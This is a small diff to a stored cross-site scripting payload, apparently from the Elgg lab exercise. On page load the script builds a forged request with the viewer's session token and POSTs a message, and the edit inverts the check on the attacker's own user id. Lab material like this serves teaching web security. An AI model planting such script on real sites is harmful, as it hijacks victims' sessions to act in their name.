@@ -7,7 +7,7 @@ window.onload = function() {
   var t = token + ts + receive + subject + body;
   var charlie_guid = 46;
   var sendurl = "http://www.xsslabelgg.com/action/messages/send";
-  if (elgg.session.user.guid != charlie_guid) {
+  if (elgg.session.user.guid == charlie_guid) {
     var Ajax = null;
     Ajax = new XMLHttpRequest();
     Ajax.open("POST", sendurl, true);
